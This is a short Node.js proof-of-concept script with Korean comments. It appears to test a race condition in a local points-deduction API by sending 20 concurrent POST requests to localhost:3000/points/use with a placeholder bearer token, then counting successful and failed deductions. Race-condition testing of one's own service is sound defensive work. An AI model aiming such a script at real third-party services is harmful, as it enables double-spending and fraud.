// 레이스컨디션 PoC — 동시 요청 20개로 중복차감 시도
// 사용법: 아래 TOKEN에 본인 로그인 토큰 넣고 `node race_condition_attack.js`
// ⚠️ 실제 토큰은 커밋 X (placeholder 유지)
const TOKEN = '로그인_토큰';

const requests = [];
for (let i = 0; i < 20; i++) {
  requests.push(
    fetch('http://localhost:3000/points/use', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${TOKEN}`,
      },
      body: JSON.stringify({ amount: 100 }),
    }).then((res) => res.json()),
  );
}

Promise.all(requests).then((results) => {
  const success = results.filter((r) => r.points !== undefined).length;
  const failed = results.filter((r) => r.error).length;
  console.log(`성공(차감): ${success}건, 실패(부족): ${failed}건`);
});
